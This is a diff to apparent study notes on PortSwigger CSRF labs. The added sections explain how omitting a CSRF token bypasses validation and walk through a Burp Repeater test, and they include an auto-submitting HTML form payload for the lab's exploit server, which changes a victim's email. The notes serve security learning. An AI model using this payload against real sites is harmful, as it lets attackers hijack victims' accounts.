@@ -245,3 +245,93 @@ Your email is: anything@web-security-academy.net
 Go back to the exploit server and change the email value in the HTML body to anything but the above. Click "Store" and then "Deliver to victim" to solve the lab.
 
 > NOTE: Check out [walkthrough](csrf_lab02_zaproxy.md) of this lab in OWASP Zed Attack Proxy
+
+### Validation of CSRF token depends on token being present
+
+Some applicaiton correctly validate the CSRF token if it is presend, but skip the validation entirely if it is omitted.
+
+In these cases, an attacker can remove the parameter that stores a CSRF token as its value entirely (not just the value) and bypass the validation to deliver a CSRF attack.
+
+```
+POST /email/change HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 25
+Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm
+
+email=pwned@evil-user.net
+```
+
+### Lab: CSRF where token validation depends on token being present
+
+Open Burp's browser, navigate to the lab and log in with credentials `wiener:peter`. 
+
+Submit "Update email" form and find the request in __Proxy__ > __History__ section. 
+
+_Request body:_
+
+```
+email=email@email.com&csrf=[[...token...]]
+```
+
+Right-click the request and select __Send to Repeater__. In the repeater, notice, if you change the CSRF token in the request body and resend the request it will be rejected. 
+
+_Response:_
+
+```
+HTTP/2 400 Bad Request
+Content-Type: application/json; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 20
+
+"Invalid CSRF token"
+```
+
+Now delete the `csrf` parameter in the request body entirely, including its value and resend the request.
+
+_Request body:_
+
+```
+email=email@email.com
+```
+
+The request was accepted this time.
+
+_Response:_
+
+```
+HTTP/2 302 Found
+Location: /my-account?id=wiener
+X-Frame-Options: SAMEORIGIN
+Content-Length: 0
+
+```
+
+Now open the __Context Menu__ (top right corner of the request pane in __Repeater__; three dashes) and click "Copy URL". Use this URL in the following HTML template (`<form>` tag `action` attribute):
+
+> NOTE: edit the second line, attribute `name` should have a value `email` and attribute `value` should have an email to replace the existing email address.
+
+```
+<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
+    <input type="hidden" name="$param1name" value="$param1value">
+</form>
+<script>
+    document.forms[0].submit();
+</script>
+```
+
+Go to exploit server and paste the resulting HTML in the "Body" section of the form and click "Store". 
+
+Click "View exploit" to see if it works on your account. You will be redirected to a page where you'll see that your email has been changed. 
+
+Now go back to the exploit server and change the `value` attribute in the second line of the HTML to any other email than the one your account was changed to. Click "Deliver to victim" to solve the lab. 
+
+> NOTE: Check out [walkthrough](csrf_lab03_zaproxy.md) of this lab in OWASP Zed Attack Proxy
+
+### CSRF token is not tied to the user session
+
+Some applications fail to check whether the CSRF token is tied to the specific session of the user making the request. Instead, they keep a global list of all issued tokens and accept any one of them, regardless of which user it was generated for. 
+
+In this case, an attacker could simply log in with their own account, grab a valid CSRF token, and then include that token in a CSRF payload aimed at the victim. Since the application accepts any token from the global pool, the malicious request will go through successfully. 
+
+
